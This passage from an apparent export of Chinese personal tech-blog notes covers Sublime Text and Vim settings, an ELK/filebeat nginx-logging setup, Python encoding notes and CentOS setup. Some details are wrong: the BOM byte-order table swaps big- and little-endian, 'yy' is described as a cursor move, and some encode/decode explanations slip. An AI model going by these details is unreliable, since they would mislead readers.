true,\n  \"autofindinselection\": true,    //在选中范围内搜索\n  \"saveonfocuslost\": true,    //自动保存文件\n  \"matchbracketssquare\": true, // 突出显示圆括号\n  \"matchbracketsbraces\": true,  // 突出显示大括号\n  \"matchbracketsangle\": true,// 是否突出显示尖括号\n  \"linepaddingtop\": 1,    // 设置每一行到顶部，以像素为单位的间距，效果相当于行距\n  \"linepaddingbottom\": 1,    // 设置每一行到底部，以像素为单位的间距，效果相当于行距\n  // 设置成true，当光标已经在第一行时，再Up则到行首，如果光标已经在最后一行，再Down则跳到行尾\n  \"movetolimitonupdown\": true,\n  \"trimtrailingwhitespaceonsave\": true,    // 保存文件时会删除每行结束后多余的空格\n  \"ensurenewlineateofonsave\": true,    // 为true时，保存文件时光标会在文件的最后添加空行\n  \"wordwrap\": \"auto\",    //自动换行\n  \"drawwhitespace\": \"all\"    // 显示所有的缩进线\n}\n\nVIM模式\n    shift+enter  向下翻页\n    zz  将当前光标所在的行居中显示\n    v   选择一个字符\n    u   撤销删除\n    d   删除选中\n    [n]dd   删除当前光标开始的连续n行\n    x   删除当前光标所在的单个字符\n    c   剪切字符\n    p   粘贴字符\n    r  －－－－－修改光标所在的字符\n    S  －－－－－删除光标所在的列，并进入输入模式\n    i   在当前字符的左边插入\n    I   在当前行首插入\n    a   在当前字符的右边插入\n    A   在当前行尾插入\n    o   在当前行下面插入一个新行\n    O   在当前行上面插入一个新行\n    yy  移动到行首\n    0   移动到行首\n    $   移动到行尾\n    H   移动光标到屏幕上面\n    M   移动光标到屏幕中间\n    L   移动光标到屏幕下面\n    {   跳到上一段的开头\n    }   跳到下一段的的开头.\n    (   移到段落开头\n    )   移到段落结尾\n    %   跳转括号匹配\n    gg  跳转到文件首\n    G   跳转到文件尾\n    f   移动到指定字符\n    [n]f    找第n个字符\n    w   后移动一个单词，光标位于行首\n    [n]w    向后移动n个单词，光标位于行首\n    e   向后移动一个单词，光标位于行尾\n    [n]e    向后移动n个单词，光标位于行尾\n    b   前移动一个单词，光标位于行首\n    [n]b    向前移动n个单词，光标位于行首\n\n自动换行是每行超过 n 个字的时候 vim 自动加上换行符用\n类似 :set textwidth=70 来设置 n\n自动折行 是把长的一行用多行显示 , 不在文件里加换行符用\n:set wrap 设置自动折行\n:set nowrap 设置不自动折行\n      :!ls  运行命令\n\nAlignment\n    选中文本并按ctrl + alt + a 就可以进行对齐操作\n\n2.Change List\n    在Ctrl+p 中使用\n3.DocBlockr\n    文档注视\n    在函数前面/ Enter\n4.HexViewer\n    ctrl+shift+b\",\"ctrl+shift+h 查看\n5.Terminal\n    ctrl+shift+t        在当前文件目录下打开终端\n    ctrl+shift+alt+t    在当前工程目录下打开终端\n\n7.SublimeAStyleFormatter    代码格式化\n    ctrl+alt+F 全部格式化\n\n9.Ctags     函数跳转\n\n    跳到定义处使用”ctrl+t ctrl+t”，跳回来使用”ctrl+t ctrl+b”\n        跳到定义处使用”ctrl+  ”，跳回来使用”ctrl+\u003c”\n\n    列出当前函数 ALT+S\n\n8.SublimeLinter             代码语法检查\n\n    默认采用cppcheck.exe    将cppcheck添加到环境变量中\n    cpplint.py 暂未调通。\n    All under the beta mode:\n    (Maybe there were something wrong with my operation before?)\n    SublimeLinter: c enabled (using \"D:\\Program Files\\Cppcheck\\cppcheck.exe\" for executable)\n    (But it seems still some problem with cpplint,py?)\n    Keyerror: u'ccpplint'\n    (But It works if I specify shell=True argument for the subprocess.Popen)\n    SublimeLinter: ccpplint enabled (using \"d:\\cpplint\\cpplint.py\" for executable)\n\n10.sublimeclang 类似Ctags\n    配置\n      |alt+d,alt+d|Go to the parent reference of whatever is under the current cursor position|\n      |alt+d,alt+i|Go to the implementation|\n      |alt+d,alt+b|Go back to where you were before hitting alt+d,alt+d or alt+d,alt+i|\n      |alt+d,alt+c|Clear the cache. Will force all files to be reparsed when needed|\n      |alt+d,alt+w|Manually warm up the cache|\n      |alt+d,alt+r|Manually reparse the current file|\n      |alt+d,alt+t|Toggle whether Clang completion is enabled or not. Useful if the complete operation is slow and you only want to use it selectively|\n      |alt+d,alt+p|Toggle the Clang output panel|\n      |alt+d,alt+e|Go to next error or warning in the file|\n      |alt+shift+d,alt+shift+e|Go to the previous error or warning in the file|\n      |alt+d,alt+s|Run the Clang static analyzer on the current file|\n      |alt+d,alt+o|Run the Clang static analyzer on the current project|\n      |alt+d,alt+f|Toggle whether fast (but possibly inaccurate) completions are used or not|\n    注:  仅支持UTF-8编码，不支持GBK\n    先保存sublime工程\n    将 MyProject 改为自己的工程名\n    Preferences-  Package Setting -  SublimeClang -  setting user\n{\n    // 不显示提示窗\n    \"showoutputpanel\": false,\n    // 不包括clang自身的头文件\n    \"dontprependclangincludes\": true,\n\n    \"additionallanguageoptions\":\n    {\n        \"c++\" :\n        [\n            \"-std=c++11\" // enable C++11\n            // \"-std=gnu++11\"\n        ],\n        \"c\":\n        [\n            \"-std=gnu11\"\n        ],\n        \"objc\":\n        [\n            \"-std=gnu11\"\n        ],\n        \"objc++\":\n        [\n            \"-std=gnu++11\"\n        ]\n    },\n\n    \"options\":\n    [\n        \"-m32\",\n        \"-w\",\n        \"-ferror-limit=9\",\n        \"-fgnu-runtime\",\n        \"-fms-extensions\",\n        \"-nostdinc\",\n        \"-DGNUC=4\",\n        \"-D_GNUCMINOR=2\",\n        \"-DGNUCPATCHLEVEL=1\",\n        \"-DGXXABIVERSION=1002\",\n        \"-Di386=1\",\n        \"-Di386=1\",\n        \"-Di386=1\",\n        \"-DWIN32=1\",\n        \"-DWIN32=1\",\n        \"-DWIN32=1\",\n        \"-DWIN32=1\",\n        \"-DWINNT=1\",\n        \"-DWINNT=1\",\n        \"-DWINNT=1\",\n        \"-DX86=1\",\n        \"-DMSVCRT=1\",\n        \"-DMINGW32=1\",\n        \"-D_STDCVERSION_=201112L\",\n        \"-Wno-deprecated-declarations\",\n        \"-Wall\",\n        \"-isystem\", \"/usr/include\",\n        \"-isystem\", \"/usr/include/c++/\",\n        // dev-Cpp\n        \"-isystem\", \"D:\\\\Program Files\\\\MingW\\\\lib\\\\gcc\\\\mingw32\\\\4.7.0\\\\include\",\n        \"-isystem\", \"D:\\\\Program Files\\\\MingW\\\\lib\\\\gcc\\\\mingw32\\\\4.7.0\\\\include\\\\c++\",\n        \"-isystem\", \"D:\\\\Program Files\\\\MingW\\\\lib\\\\gcc\\\\mingw32\\\\4.7.0\\\\include\\\\c++\\\\mingw32\",\n        // Cfree5\n        \"-isystem\", \"D:\\\\Program Files\\\\MingW\\\\lib\\\\gcc\\\\mingw32\\\\3.4.5\\\\include\"\n        \"-isystem\", \"D:\\\\Program Files\\\\MingW\\\\include\",\n        \"-I${folder:${projectpath:Gateway.sublime-project}}/\"\n    ]\n}\n\n    如果是单独的项目，在项目文件中添加\n\n        \"settings\":\n        {\n            \"sublimeclangoptions\":\n            [\n                \"-I/home/wyang/workspace/muduo\",\n                \"-I/home/wyang/workspace/muduo/\"\n            ]\n        }\n    记得在build文件中添加--std=c++11使Build\u0026Run功能生效\n11.SublimeCodeIntel\n        多种语言的代码提示功能\n        打开 SublimeClang 的 user-setting 文件, 添加\n\n        {\n            \"codeintelconfig\": {\n                \"Python\": {\n                    \"env\": {\n                        \"PYTHONPATH\": \"/usr/lib/python2.7/site-packages:/usr/lib/python:$PYTHONPATH\"\n                    }\n                }\n            }\n        }\n12.SublimeGDB\n        gdb的一个插件，可以用来简单调试\n        同上安装\n        在项目文件中添加\n\n        \"settings\":\n        {\n            \"sublimegdbcommandline\": \"gdb --interpreter=mi ./contains\",\n            \"sublimegdbworkingdir\": \"${folder:${project_path:contains.cc}}\"\n        }\n        注意在build文件中加入-g（调试）选项\n\nMarkdownEditing\n14.TodoReview\n\n{\n    \"patterns\": {\n        \"TAG\": \"TAG[\\\\s]?:+(?Ptag.)$\",\n        \"TODO\": \"TODO[\\\\s]?:+(?Ptodo.)$\",\n        \"NOTE\": \"NOTE[\\\\s]?:+(?Pnote.)$\",\n        \"FIXME\": \"FIX ?ME[\\\\s]?:+(?Pfixme.)$\",\n        \"UPDATE\": \"UPDATE[\\\\s]?:+(?Pupdate.)$\",\n        \"CHANGED\": \"CHANGED[\\\\s]?:+(?Pchanged.)$\"\n    }\n}\n\n使用： //TODO:  注释\n13.ConvertToUTF8\n\n    解决乱码\n    1.在 Sublime Text 里打开这个文件（状态栏应显示为 UTF-8）\n    选择菜单 File -  Save with Encoding -  Western (Windows 1252)\n    关闭再打开就正常了。\n\n    对中文操作系统来说，Ansi就是gb2312或gbk.\n    unicode是一种编码方式，和ascii是同一个概念，而UTF是一种存储方式（格式）\n    编码指不同国家的语言在计算机中的一种存储和解释规范\n    ANSI与ASCII\n    最初，Internet上只有一种字符集——ANSI的ASCII字符集(American Standard Code for Information Interchange， “美国信息交换标准码），它使用7 bits来表示一个字符，总共表示128个字符，后来IBM公司在此基础上进行了扩展，用8bit来表示一个字符，总共可以表示256个字符，充分利用了一个字节所能表达的最大信息\n    ANSI字符集：ASCII字符集，以及由此派生并兼容的字符集，如：GB2312，正式的名称为MBCS（Multi-Byte Chactacter System，多字节字符系统），通常也称为ANSI字符集。\n\n    UNICODE与UTF8，UTF16\n\n        由于每种语言都制定了自己的字符集，导致最后存在的各种字符集实在太多，在国际交流中要经常转换字符集非常不便。因此，产生了Unicode字符集，它固定使用16 bits（两个字节）来表示一个字符，共可以表示65536个字符\n    标准的Unicode称为UTF-16(UTF:UCS Transformation Format )。后来为了双字节的Unicode能够在现存的处理单字节的系统上正确传输，出现了UTF-8，使用类似MBCS的方式对Unicode进行编码。(Unicode字符集有多种编码形式)\n    例如“连通”两个字的Unicode标准编码UTF-16 (big endian）为：DE 8F 1A 90\n    而其UTF-8编码为：E8 BF 9E E9 80 9A\n        当一个软件打开一个文本时，它要做的第一件事是决定这个文本究竟是使用哪种字符集的哪种编码保存的。软件一般采用三种方式来决定文本的字符集和编码：\n    检测文件头标识，提示用户选择，根据一定的规则猜测\n    最标准的途径是检测文本最开头的几个字节，开头字节 Charset/encoding,如下表：\n    EF BB BF UTF-8\n    FE FF UTF-16/UCS-2, little endian\n    FF FE UTF-16/UCS-2, big endian\n    FF FE 00 00 UTF-32/UCS-4, little endian.\n    00 00 FE FF UTF-32/UCS-4, big-endian.\n\n    Windows下 新建文本文件\n    ni好\n    6E 69 Ba C3             ANSI    默认编码\n    6e 69 e5 a5 bd          UTF-8   无Bom\n    ef bb bf 6e 69 e5 a5 bd     UTF-8   标准\n    fe ff 00 6e 00 69 59 7d     UCS-2   Big\n    ff fe 6e 00 69 00 7d 59     UCS-2   Little\n\n14.Theme - Soda 主题\nspacegrayhttps://github.com/kkga/spacegray/\n\"Alignment\",\n\"C++ Snippets\",\n\"ConvertToUTF8\",\n\"Cscope\",   cscope -Rbq\n\"CTags\",\n\"DocBlockr\",\n\"GitGutter\",\n\"Open-Include\",\n\"Package Control\",\n\"Search Stack Overflow\",\n\"SideBarEnhancements\",\n\"SideBarGit\",\n\"Sublime Files\",\n\"SublimeAStyleFormatter\",\n\"TodoReview\",\n\"Vintageous\"\nTheme - Centurion\nTheme - Soda\nTheme - Spacegray","tags":null},{"location":"//blog.pytool.com/Post/Elastic/2016-10-04 Elastic 初探","title":"初探ELK-以收集 nginx 日志为例示范搭建一个 ELK 环境的基本步骤","text":"初探ELK-以收集 nginx 日志为例示范搭建一个 ELK 环境的基本步骤\n2017/2/15\n\n一、环境\n1、RPM\n1）收集 rpm 包\nwget https://download.elastic.co/logstash/logstash/packages/centos/logstash-2.4.0.noarch.rpm\nwget https://download.elastic.co/elasticsearch/release/org/elasticsearch/distribution/rpm/elasticsearch/2.4.0/elasticsearch-2.4.0.rpm\nwget https://download.elastic.co/kibana/kibana/kibana-4.6.1-x8664.rpm\nwget https://download.elastic.co/beats/filebeat/filebeat-1.3.1-x8664.rpm\n\n2）缓存rpm包到本地yum源\n\n2、安装\n【服务端】\n1）ELK\n[root@vm220 ~]# yum install elasticsearch kibana logstash -y\n2）jdk\n（略）\n\n【客户端】\n1）filebeat\n[root@vm49 ~]# yum install filebeat -y\n\n3、前提\n假设要收集下面2个域名的 access 和 error 日志：\nwww.test.com\nwww.work.com\n\n其中 access 日志的格式如下：\n\n    logformat  online '$remoteaddr [$timelocal] \"$request\" '\n                   '\"$httpcontenttype\" \"$requestbody\" \"$httpreferer\" '\n                   '$status $requesttime $bodybytessent';\n\n而 error 日志采取默认的级别（error）。\n且要求：为每个域名使用独立的 index\n\n二、ELK 服务端配置\n1、配置 elasticsearch 服务【存储数据（来自 logstash ）】\n1）配置文件\n[root@vm220 ~]# mkdir -p /data/elasticsearch\n[root@vm220 ~]# chown elasticsearch:elasticsearch /data/elasticsearch\n[root@vm220 ~]# cp -a /etc/elasticsearch/elasticsearch.yml{,.bak}\n调整配置文件：\n【如果 ES 是单节点】\n[root@vm220 ~]# grep ^ /etc/elasticsearch/elasticsearch.yml\ncluster.name: es-cluster-test\nnode.name: node-vm220\npath.data: /data/elasticsearch\npath.logs: /var/log/elasticsearch\nnetwork.host: 0.0.0.0\n\n【如果 elasticsearch 是集群】\n[root@vm220 ~]# grep ^ /etc/elasticsearch/elasticsearch.yml    \ncluster.name: es-cluster-test\nnode.name: node-vm220\npath.data: /data/elasticsearch\npath.logs: /var/log/elasticsearch\nnetwork.host: 0.0.0.0\ndiscovery.zen.ping.unicast.hosts: [\"10.50.200.218\", \"10.50.200.219\", \"10.50.200.220\"]\ndiscovery.zen.minimummasternodes: 3\n其他节点类似\n\n2）启动服务\n[root@vm220 ~]# service elasticsearch start\n[root@vm220 ~]# chkconfig elasticsearch on\n\n2、配置 kibana 服务【展示数据（来自 elasticsearch ）】\n1）配置文件\n[root@vm220 ~]# service kibana start\n2）启动服务\n[root@vm220 ~]# chkconfig kibana on\n3）访问\nhttp://10.50.200.220:5601/app/kibana\n\n3、配置 logstash 服务【过滤数据（来自 filebeat 发往 elasticsearch）】\n1）配置自定义的 pattern\n[root@vm220 ~]# mkdir -p /etc/logstash/patterns.d\n[root@vm220 ~]# cat /etc/logstash/patterns.d/extrapatterns\nNGINXACCESS %{IPORHOST:clientip} \\[%{HTTPDATE:timestamp}\\] \"%{WORD:verb} %{URIPATHPARAM:request} HTTP/%{NUMBER:httpversion}\" (?:%{QS:contenttype}|-) (?:%{QS:requestbody}|-) (?:\"(?:%{URI:referrer}|-)\"|%{QS:referrer}) %{NUMBER:response} %{BASE16FLOAT:requesttime} (?:%{NUMBER:bytes}|-)\nNGINXERRORDATESTAMP %{YEAR}/%{MONTHNUM}/%{MONTHDAY} %{TIME}\nNGINXERRORPID (?:[0-9]+#[0-9]+\\:)\nNGINXERRORTID (?:\\[0-9]+)\nNGINXERROR %{NGINXERRORDATESTAMP:timestamp} \\[%{LOGLEVEL:loglevel}\\] %{NGINXERRORPID:pid} %{NGINXERRORTID:tid} %{GREEDYDATA:errormsg}, client: %{IPORHOST:clientip}, server: %{HOSTNAME:server}, request: %{QS:request}(?:, upstream: %{QS:upstream})?, host: \\\"%{HOSTNAME:hostname}\\\"(?:, referrer: (?:\"(?:%{URI:referrer}|-)\"|%{QS:referrer}))?\n\n2）调整配置文件\n[root@vm220 ~]# cat /etc/logstash/conf.d/filebeat.conf\ninput {\n    beats {\n        port =  \"5044\"\n    }\n}\n\nfilter {\n    if[type] =~ \"NginxAccess-\" {\n        grok {\n            patternsdir =  [\"/etc/logstash/patterns.d\"]\n            match =  {\n                \"message\" =  \"%{NGINXACCESS}\"\n            }\n        }\n        date {\n            match =  [ \"timestamp\", \"dd/MMM/YYYY:HH:mm:ss Z\" ]\n            removefield =  [ \"timestamp\" ]\n        }\n    }\n    if[type] =~ \"NginxError-\" {\n        grok {\n            patternsdir =  [\"/etc/logstash/patterns.d\"]\n            match =  {\n                \"message\" =  \"%{NGINXERROR}\"\n            }\n        }\n        date {\n            match =  [ \"timestamp\", \"YYYY/MM/dd HH:mm:ss\" ]\n            removefield =  [ \"timestamp\" ]\n        }\n    }\n}\n\noutput {\n    if[type] == \"NginxAccess-www.test.com\" {\n        elasticsearch {\n            hosts =  \"10.50.200.220:9200\"\n            managetemplate =  false\n            index =  \"%{@metadata}-nginxaccess-www.test.com-%{+YYYY.MM.dd}\"\n            documenttype =  \"%{@metadata}\"\n        }\n    }\n    if[type] == \"NginxAccess-www.work.com\" {\n        elasticsearch {\n            hosts =  \"10.50.200.220:9200\"\n            managetemplate =  false\n            index =  \"%{@metadata}-nginxaccess-www.work.com-%{+YYYY.MM.dd}\"\n            documenttype =  \"%{@metadata}\"\n        }\n    }\n    if[type] == \"NginxError-www.test.com\" {\n        elasticsearch {\n            hosts =  \"10.50.200.220:9200\"\n            managetemplate =  false\n            index =  \"%{@metadata}-nginxerror-www.test.com-%{+YYYY.MM.dd}\"\n            documenttype =  \"%{@metadata}\"\n        }\n    }\n    if[type] == \"NginxError-www.work.com\" {\n        elasticsearch {\n            hosts =  \"10.50.200.220:9200\"\n            managetemplate =  false\n            index =  \"%{@metadata}-nginxerror-www.work.com-%{+YYYY.MM.dd}\"\n            documenttype =  \"%{@metadata}\"\n        }\n    }\n}\n【如果 elasticsearch 是集群】\n将：\n            hosts =  \"10.50.200.220:9200\"\n调整为：\n            hosts =  [\"10.50.200.218:9200\", \"10.50.200.219:9200\", \"10.50.200.220:9200\"]\n\n3）启动服务\n[root@vm220 ~]# service logstash restart\n[root@vm220 ~]# chkconfig logstash on\n\n三、使用 filebeat 在客户端收集日志。\n1）配置 filebeat 服务\n[root@vm49 ~]# cp /etc/filebeat/filebeat.yml{,.bak}\n[root@vm49 ~]# cat /etc/filebeat/filebeat.yml |grep -Ev '^(#|  #|    #|      #|        #|$)'\nfilebeat:\n  prospectors:\n    paths:\n        /var/log/nginx/accesswww.test.com.log\n      inputtype: log\n      documenttype: NginxAccess-www.test.com\n    paths:\n        /var/log/nginx/accesswww.work.com.log\n      inputtype: log\n      documenttype: NginxAccess-www.work.com\n    paths:\n        /var/log/nginx/errorwww.test.com.log\n      inputtype: log\n      documenttype: NginxError-www.test.com\n    paths:\n        /var/log/nginx/errorwww.work.com.log\n      inputtype: log\n      documenttype: NginxError-www.work.com\n  registryfile: /var/lib/filebeat/registry\noutput:\n  logstash:\n    hosts: [\"10.50.200.220:5044\"]\nshipper:\nlogging:\n  tofiles: true\n  files:\n    path: /var/log/filebeat\n    name: filebeat\n    rotateeverybytes: 10485760 # = 10MB\n\n2）导入安装 filebeat 时，自带的模版\n模版路径：/etc/filebeat/filebeat.template.json\n自己可以在默认的模版的基础上做调整，例如，对比默认配置，新增的内容为：\n      \"dynamictemplates\": [\n        {\n          \"template1\": {\n            \"mapping\": {\n              \"docvalues\": true,\n              \"ignoreabove\": 1024,\n              \"index\": \"notanalyzed\",\n              \"type\": \"{dynamictype}\"\n            },\n            \"match\": \"\"\n          }\n        }\n      ],\n（略）\n        \"type\" : {\n          \"type\" : \"string\",\n          \"index\": \"notanalyzed\"\n        },\n        \"inputtype\" : {\n          \"type\" : \"string\",\n          \"index\": \"no\"\n        },\n        \"beat\" : {\n          \"properties\" : {\n            \"hostname\" : {\n              \"type\" : \"string\",\n              \"index\": \"notanalyzed\",\n              \"docvalues\": \"true\"\n            },\n            \"name\" : {\n              \"type\" : \"string\",\n              \"index\": \"notanalyzed\",\n              \"docvalues\": \"true\"\n            }\n          }\n        },\n        \"source\" : {\n          \"type\" : \"string\",\n          \"index\": \"no\"\n        },\n        \"offset\": {\n          \"type\": \"long\",\n          \"index\": \"no\"\n        },\n        \"count\" : {\n          \"type\" : \"long\",\n          \"index\": \"no\"\n        },\n        \"host\" : {\n          \"type\" : \"string\",\n          \"index\": \"notanalyzed\"\n        },\n        \"tags\" : {\n          \"type\" : \"string\",\n          \"index\": \"notanalyzed\"\n        },\n        \"bytes\" : {\n          \"type\" : \"long\",\n          \"index\": \"notanalyzed\"\n        },\n        \"geoip\" : {\n          \"properties\" : {\n            \"location\" : {\n              \"type\" : \"geopoint\",\n              \"index\": \"notanalyzed\"\n            }\n          }\n        }\n（略）\na、导入模版\n[root@vm220 ~]# curl -XPUT 'http://10.50.200.220:9200/template/filebeat?pretty' -d@/etc/filebeat/filebeat.template.json\n\nb、查看模版\n[root@vm220 ~]# curl 'http://10.50.200.220:9200/template/filebeat?pretty'\n\nc、清理旧的 index（如果是新配置的服务，没有生成任何 index 因此也不需要清理，可略过这一步）\n先查看现有的 index\n[root@vm220 ~]# curl '10.50.200.220:9200/cat/indices?v'\n删除 filebeat- 匹配的所有 index\n[root@vm220 ~]# curl -XDELETE 'http://10.50.200.220:9200/filebeat-?pretty'\n再次查看，确认一下结果是否符合预期：\n[root@vm220 ~]# curl '10.50.200.220:9200/cat/indices?v'\n\n3）启动服务\n[root@vm49 ~]# service filebeat restart\n[root@vm49 ~]# chkconfig filebeat on","tags":null},{"location":"//blog.pytool.com/Post/2016-06-01 Linux命令 python","title":"python","text":"用pyenv和virtualenv搭建单机多版本python虚拟开发环境\nsudo apt-get install python python-pip\n\n设置python编码\n  在 python 源代码文件中，如果你有用到非ASCII字符，则需要在文件头部进行字符编码的声明，声明如下：\n\n    # code: UTF-8\n\n!/usr/bin/python\n -- coding: encoding name --     ##推荐使用，支持更多的编辑器\ncoding=encoding name\n原文\n在 python 源代码文件中，如果你有用到非ASCII字符，则需要在文件头部进行字符编码的声明，声明如下：\n\n    code: UTF-8\n\n因为python 只检查 #、coding 和编码字符串，所以你可能回见到下面的声明方式，这是有些人为了美观等原因才这样写的：\n\n   #-- coding: UTF-8 --\n\n常见编码介绍：\n\n       GB2312编码：适用于汉字处理、汉字通信等系统之间的信息交换\n       GBK编码：是汉字编码标准之一，是在 GB2312-80 标准基础上的内码扩展规范，使用了双字节编码\n       ASCII编码：是对英语字符和二进制之间的关系做的统一规定\n       Unicode编码：这是一种世界上所有字符的编码。当然了它没有规定的存储方式。\n       UTF-8编码：是 Unicode Transformation Format - 8 bit 的缩写， UTF-8 是 Unicode 的一种实现方式。它是可变长的编码方式，可以使用 1~4 个字节表示一个字符，可根据不同的符号而变化字节长度。\n\n编码转换：\n\nPython内部的字符串一般都是 Unicode编码。代码中字符串的默认编码与代码文件本身的编码是一致的。所以要做一些编码转换通常是要以Unicode作为中间编码进行转换的，即先将其他编码的字符串解码（decode）成 Unicode，再从 Unicode编码（encode）成另一种编码。\n\n       decode 的作用是将其他编码的字符串转换成 Unicode 编码，eg name.decode(“GB2312”)，表示将GB2312编码的字符串name转换成Unicode编码\n       encode 的作用是将Unicode编码转换成其他编码的字符串，eg name.encode(”GB2312“)，表示将GB2312编码的字符串name转换成GB2312编码\n\n所以在进行编码转换的时候必须先知道 name 是那种编码，然后 decode 成 Unicode 编码，最后载 encode 成需要编码的编码。当然了，如果 name 已经就是 Unicode 编码了，那么就不需要进行 decode 进行解码转换了，直接用 encode 就可以编码成你所需要的编码。值得注意的是：对 Unicode 进行编码和对 str 进行编码都是错误的。\n\n具体的说就是：如果在UTF-8文件中，则这个字符串就是 UTF-8编码的。它的编码取决于当前的文本编码。当然了，GB2312文本的编码就是GB2312。要在同一个文本中进行两种编码的输出等操作就必须进行编码的转换，先用decode将文本原来的编码转换成Unicode，再用encode将编码转换成需要转换成的编码。\n\neg：\n由于内置函数 open() 打开文件时，read() 读取的是 str，读取后需要使用正确的编码格式进行 decode()。write() 写入时，如果参数是 Unicode，则需要使用你希望写入的编码进行 encode()，如果是其他编码格式的 str，则需要先用该 str 的编码进行 decode()，转成 Unicode 后再使用写入的编码进行 encode()。如果直接将 Unicode 作为参数传入 write() ，python 将先使用源代码文件声明的字符编码进行编码然后写入。\n\n   # coding: UTF-8\n\n   fp1 = open('test.txt', 'r')\n   info1 = fp1.read()\n   # 已知是 GBK 编码，解码成 Unicode\n   tmp = info1.decode('GBK')\n\n   fp2 = open('test.txt', 'w')\n   # 编码成 UTF-8 编码的 str\n   info2 = tmp.encode('UTF-8')\n   fp2.write(info2)\n   fp2.close()\n\n获取编码的方式：\n判断是 s 字符串否为Unicode，如果是返回True，不是返回False ：\n\n   isinstance(s, unicode)\n\n下面代码可以获取系统默认编码：\n\n   #!/usr/bin/env python\n   #coding=utf-8\n   import sys\n   print sys.getdefaultencoding()\n\n安装 Scrapy\nsudo apt install python-pip\nsudo apt install libssl-dev\nsudo apt install python-lxml\nsudo pip install scrapy\n`","tags":null},{"location":"//blog.pytool.com/Linux/2011-01-01 Linux及常用工具配置","title":"Linux及常用工具配置","text":"Linux及常用工具配置 \n\n- -\n身为码农，表示十分痛恨服务器上的各种乱七八糟配置，平时很少用到Linux命令，对Linux一直保持在学了就忘，忘了再学的死循环中，故做此笔记，可能以后翻看的机会也不多，毕竟总有用到的时候\n\nPS:本文仅针对CentOS，使用其他发行版Linux请绕行，有补充的可以fork我\n\n另外本文不包含安装部分，不会安装的请自行查阅\n- -\n\n一、准备 \n\n操作系统\nCentOS\n（本人使用的是7，推荐安装Minimal版，不使用系统自带工具，全部自己安装）\n\n虚拟机软件（仅针对在Windows/Mac操作系统下学习CentOS，否则略过此项）\nVirtualBox\n（推荐使用开源软件，并且本文仅针对此虚拟机）\n\n- -\n\n二、系统篇 \n\ntable\n\ttr\n\t\tth说明/th\n\t\tth命令/th\n\t/tr\n\ttr\n\t\ttd查看系统内核/td\n\t\ttduname -r/td\n\t/tr\n\ttr\n\t\ttd查看内核全部信息/td\n\t\ttduname -a/td\n\t/tr\n\ttr\n\t\ttd开启防火墙（仅针对CentOS 7）/td\n\t\ttdsystemctl start firewalld.service/td\n\t/tr\n\ttr\n\t\ttd关闭防火墙（仅针对CentOS 7，用虚拟机练习推荐关闭）/td\n\t\ttdsystemctl stop firewalld.service/td\n\t/tr\n/table\n\n- -\n\n三、网络篇 \n\n查看IP（Minimal版没有ifconfig命令）\nip addr\n修改配置文件（文件名不一定叫这个）\nvi /etc/sysconfig/network-scripts/ifcfg-eth0\n将ONBOOT改为yes，意思是在系统启动时是否激活网卡\n将NMCONTROLLED改为yes，如果没有添加这一行，意思是实时生效，无需重启网卡\n重启网络服务\nservice network restart\n\n- -\n\n四、通讯篇 \n\n默认情况下宿主机是不能访问virtualbox内部的，所以要做如下操作\n\n查看宿主机网络连接，安装virtualbox时会默认创建一个名为VirtualBox Host-Only Network的网络连接\n\n查看ip段，通常是192.168.56.\\，不必修改，记住即可\n\n修改虚拟机网络设置，添加网卡2，连接方式选择仅主机(Host-Only)适配器，保存\n\n在虚拟机内使用ip addr重新查看，记住新网卡的ip段，必须和VirtualBox Host-Only Network的IP段一致，如果一致，在宿主机访问虚拟机，查看是否能ping通\n检查vsftpd软件是否安装，默认没有安装，无法远程连接该系统\nrpm -qa|grep vsftpd\n安装vsftpd\nyum -y install vsftpd\n修改/etc/vsftpd/下的ftpusers和userlist文件，删除拒绝远程登录的账号\n启动vsftpd服务\nservice vsftpd start\n\n- -\n\n五、基本工具 \n\n更新yum\nyum update\n安装vim（文本编辑器，Minimal版默认只安装了vi，没有vim）\nyum -y install vim\n安装gcc（C语言源码编译）\nyum -y install gcc-c++\n安装zlib（解压缩工具）\nyum -y install zlib\n安装wget（下载工具）\nyum -y install wget\n安装pcre（正则表达式）\nyum -y install pcre\n安装openssl（用于https）\nyum -y install openssl\n安装make（安装工具）\nyum -y install make\n\n- -\n\n六、环境变量 \n\nlinux的环境变量分多个，级别不同\n\n系统级环境变量\n/etc/profile\n/etc/environment\n\n用户级环境变量\n~/.profile\n~/.bashrc\n\n修改后立即生效\nsource 环境变量\n\n- -\n\n七、软件篇 \n\n推荐用wget [url]命令下载，也可用ftp上传，无需安装的推荐放到/usr/lib/路径下\n\nJdk \n无需安装，直接解压缩后配置环境变量既可用\n\n以jdk7为例，修改环境变量，在末尾添加以下几行（配置完毕后不要忘记使用source令环境变量生效）\nexport JAVAHOME=/usr/lib/jvm/jdk7 (jdk解压路径)\nexport JREHOME=${JAVAHOME}/jre\nexport CLASSPATH=.:${JAVAHOME}/lib:${JREHOME}/lib\nexport PATH=$PATH:${JAVAHOME}/bin\n\n- -\n\nScala \n无需安装，直接解压缩后配置环境变量既可用，但需要先安装Jdk\n\n以scala-2.11为例，修改环境变量，在末尾添加以下几行（配置完毕后不要忘记使用source令环境变量生效）\nexport SCALAHOME=/usr/lib/scala/scala-2.11 (scala类库解压路径)\nexport PATH=$PATH:${SCALAHOME}/bin\n\n- -\n\nTomcat \n无需安装，直接解压缩后配置环境变量既可用，但需要先安装Jdk\n\n以Tomcat8.0.35为例修改环境变量，在末尾添加一行（配置完毕后不要忘记使用source令环境变量生效）\nexport TOMCATHOME=/usr/local/tomcat-8.0.35 (Tomcat解压路径)\n配置虚拟内存，在#!/bin/sh下面添加\nJAVAOPTS='-Xms256m (初始化堆内存)\n-Xmx512m (最大堆内存)\n-XX:PermSize=256m (初始化栈内存)\n-XX:MaxPermSize=512m (最大栈内存)'\n\n- -\n\nNginx \n安装 \nMinimal版没有依赖项源码，需要先下载pcre/openssl/zlib的源码再安装（不是安装后的，install文件夹里都有），安装包推荐放到/usr/src/路径下\n\n解压安装包后，执行configure文件，如果不能执行，先用chmod赋权，并追加参数\n./configure \\\n--prefix=/usr/local/nginx-1.11.0 (安装路径) \\\n--with-httpsslmodule (支持https) \\\n--with-httpstubstatusmodule (支持状态监控) \\\n--with-pcre=/usr/src/pcre (pcre源码路径)\n--with-openssl=/usr/src/openssl (openssl源码路径)\n--with-zlib=/usr/src/zlib (zlib源码路径)\n成功后依次执行\nmake\nmake install\n启动nginx服务器\n/usr/local/nginx-1.11.0/sbin/nginx\n停止nginx服务器\n/usr/local/nginx-1.11.0/sbin/nginx -s stop\n重新加载配置\n/usr/local/nginx-1.11.0/sbin/nginx -s reload\n\n基础配置 \n主配置文件：conf/nginx.conf\nworkerprocesses  1; 